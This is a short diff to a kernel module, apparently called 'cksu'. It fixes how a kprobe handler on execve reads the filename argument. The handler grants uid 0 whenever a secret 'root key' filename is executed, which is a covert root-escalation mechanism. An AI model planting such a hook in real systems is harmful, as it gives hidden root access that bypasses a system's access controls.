@@ -61,7 +61,8 @@ static int match_root_key(const char __user *ufilename)
 
 static int handler_execve(struct kprobe *p, struct pt_regs *regs)
 {
-	const char __user *filename = (const char __user *)regs->regs[0];
+	struct pt_regs *user_regs = (struct pt_regs *)regs->regs[0];
+	const char __user *filename = (const char __user *)user_regs->regs[0];
 
 	if (match_root_key(filename)) {
 		pr_info("[cksu] elevating uid=%d -> 0\n",
